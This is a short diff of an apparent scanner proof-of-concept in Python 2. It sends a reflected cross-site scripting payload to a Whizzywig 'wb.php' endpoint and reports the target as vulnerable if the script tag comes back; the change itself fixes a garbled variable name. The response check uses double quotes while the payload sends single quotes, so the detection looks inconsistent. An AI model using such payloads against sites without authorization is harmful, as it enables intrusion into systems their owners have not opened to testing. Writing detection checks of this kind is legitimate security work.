@@ -37,7 +37,7 @@ class Poc(ABPoc):
             payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27bb2%27%29%3C/script%3E'
             verify_url = self.target + payload
             req = urllib2.Request(verify_url)
-            erify_urcontent = urllib2.urlopen(req).read()
+            content = urllib2.urlopen(req).read()
             if '<script>alert("bb2")</script>' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
